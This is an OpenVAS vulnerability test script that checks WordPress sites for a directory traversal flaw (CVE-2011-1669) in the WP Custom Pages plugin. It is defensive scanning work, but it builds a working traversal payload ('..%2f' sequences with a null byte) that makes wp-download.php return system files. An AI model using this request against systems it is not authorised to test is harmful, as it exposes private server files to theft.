###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_custom_pages_plugin_dir_trav.nasl 10235 2018-06-18 13:14:33Z cfischer $
#
# WordPress WP Custom Pages Plugin 'url' Parameter Directory Traversal Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802013");
  script_version("$Revision: 10235 $");
  script_tag(name:"last_modification", value:"$Date: 2018-06-18 15:14:33 +0200 (Mon, 18 Jun 2018) $");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_cve_id("CVE-2011-1669");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress WP Custom Pages Plugin 'url' Parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17119/");
  script_xref(name:"URL", value:"http://securityreason.com/exploitalert/10284");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/wp-custom-pages/");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.

  Impact Level: Application");

  script_tag(name:"affected", value:"WordPress WP Custom Pages Version 0.5.0.1, Other versions may
  also be affected.");

  script_tag(name:"insight", value:"The flaw is due to input validation error in 'url' parameter to
  'wp-content/plugins/wp-custom-pages/wp-download.php', which allows
  attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is installed with WordPress WP Custom Pages Plugin and is
  prone to directory traversal vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){

  url = string(dir, "/wp-content/plugins/wp-custom-pages/wp-download.php?url=", crap(data:"..%2f", length:3*15), files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file)){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);